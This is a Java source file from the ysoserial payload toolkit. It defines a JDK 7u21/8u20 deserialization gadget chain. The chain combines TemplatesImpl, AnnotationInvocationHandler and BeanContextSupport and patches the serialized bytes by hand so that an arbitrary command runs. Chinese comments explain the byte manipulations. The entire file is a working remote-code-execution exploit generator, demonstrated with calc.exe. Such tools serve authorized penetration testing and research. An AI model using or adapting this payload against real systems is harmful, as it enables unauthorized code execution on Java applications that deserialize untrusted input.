 package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import ysoserial.Deserializer;
import ysoserial.payloads.util.ByteUtil;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

 public class Jdk8u20_feihong implements ObjectPayload{

     public byte[] getPayload(final String command) throws Exception {
         TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(command);

         InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class,new HashMap<>());
         Reflections.setFieldValue(ih,"type", Templates.class);
         Templates proxy = Gadgets.createProxy(ih,Templates.class);
         HashMap hm = new HashMap();
         hm.put("f5a5a608",templates);
         Reflections.setFieldValue(ih,"memberValues",hm);

         BeanContextSupport b = new BeanContextSupport();
         Reflections.setFieldValue(b,"serializable",0);
         Reflections.setFieldValue(b,"beanContextChildPeer",b);


         LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy
         set.add(b);


         ByteArrayOutputStream baous = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baous);
         oos.writeObject(set);
         oos.writeObject(ih);
         oos.writeObject(templates);
         oos.writeObject(proxy);
         oos.close();

         byte[] bytes = baous.toByteArray();
         bytes[89] = 3; //修改hashset的长度（元素个数
         //调整 TC_ENDBLOCKDATA 标记的位置
         //0x73 = 115, 0x78 = 120
         //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
         for(int i = 0; i < bytes.length; i++){
             if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 & bytes[i+3] == 0 &&
                 bytes[i+4] == 120 && bytes[i+5] == 120 && bytes[i+6] == 115){
                 System.out.println("[+] Delete TC_ENDBLOCKDATA at the end of HashSet");
                 bytes = ByteUtil.deleteAt(bytes, i + 5);
                 break;
             }
         }

         //将 serializable 的值修改为 1
         //0x73 = 115, 0x78 = 120
         //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
         for(int i = 0; i < bytes.length; i++){
             if(bytes[i] == 120 && bytes[i+1] == 0 && bytes[i+2] == 1 && bytes[i+3] == 0 &&
                 bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 115){
                 System.out.println("[+] Modify BeanContextSupport.serializable from 0 to 1");
                 bytes[i+6] = 1;
                 break;
             }
         }


         /**
          TC_BLOCKDATA - 0x77
          Length - 4 - 0x04
          Contents - 0x00000000
          TC_ENDBLOCKDATA - 0x78
          **/

         //把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后
         //目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流
         //0x77 = 119, 0x78 = 120
         //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
         for(int i = 0; i < bytes.length; i++){
             if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                 bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 120){
                 System.out.println("[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport");
                 bytes = ByteUtil.deleteAt(bytes, i);
                 bytes = ByteUtil.deleteAt(bytes, i);
                 bytes = ByteUtil.deleteAt(bytes, i);
                 bytes = ByteUtil.deleteAt(bytes, i);
                 bytes = ByteUtil.deleteAt(bytes, i);
                 bytes = ByteUtil.deleteAt(bytes, i);
                 bytes = ByteUtil.deleteAt(bytes, i);
                 break;
             }
         }


                 /*
              serialVersionUID - 0x00 00 00 00 00 00 00 00
                  newHandle 0x00 7e 00 28
                  classDescFlags - 0x00 -
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_NULL - 0x70
              newHandle 0x00 7e 00 29
         */
         //0x78 = 120, 0x70 = 112
         //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL
         for(int i = 0; i < bytes.length; i++){
             if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                 bytes[i + 4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 0 &&
                 bytes[i+8] == 0 && bytes[i+9] == 0 && bytes[i+10] == 0 && bytes[i+11] == 120 &&
                 bytes[i+12] == 112){
                 System.out.println("[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler");
                 i = i + 13;
                 bytes = ByteUtil.addAtIndex(bytes, i++, (byte) 0x77);
                 bytes = ByteUtil.addAtIndex(bytes, i++, (byte) 0x04);
                 bytes = ByteUtil.addAtIndex(bytes, i++, (byte) 0x00);
                 bytes = ByteUtil.addAtIndex(bytes, i++, (byte) 0x00);
                 bytes = ByteUtil.addAtIndex(bytes, i++, (byte) 0x00);
                 bytes = ByteUtil.addAtIndex(bytes, i++, (byte) 0x00);
                 bytes = ByteUtil.addAtIndex(bytes, i++, (byte) 0x78);
                 break;
             }
         }

         //将 sun.reflect.annotation.AnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD
         //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改
         //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEnd = true，导致 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
         // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
         // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
         // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
         for(int i = 0; i < bytes.length; i++){
             if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 &&
                 bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){
                 System.out.println("[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to " +
                     "SC_SERIALIZABLE | SC_WRITE_METHOD");
                 i = i + 58;
                 bytes[i] = 3;
                 break;
             }
         }

         //加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束
         System.out.println("[+] Add TC_BLOCKDATA at end");
         bytes = ByteUtil.addAtLast(bytes, (byte) 0x78);

         return bytes;
     }

     public static void main(final String[] args) throws Exception {
         byte[] b = new Jdk8u20_feihong().getPayload("calc.exe");
         Deserializer.deserialize(b);
     }

     @Override
     public Object getObject(String command) throws Exception {
         return getPayload(command);
     }
 }
